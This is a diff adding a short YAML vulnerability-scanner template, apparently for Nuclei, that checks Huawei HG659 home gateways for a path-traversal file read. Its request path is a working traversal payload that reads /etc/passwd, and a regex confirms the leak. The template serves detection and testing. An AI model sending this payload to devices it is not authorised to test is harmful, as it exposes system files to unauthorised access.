@@ -1,0 +1,20 @@
+id: huawei-home-gateway-hg659-fileread
+info:
+  name: Huawei Home Gateway HG659 File Read
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: fileread
+  description: |
+    Detects Huawei Home Gateway HG659 file read vulnerability by checking for unauthorized access to /etc/passwd.
+http:
+  - method: GET
+    path:
+      - "/lib///....//....//....//....//....//....//....//....//etc//passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
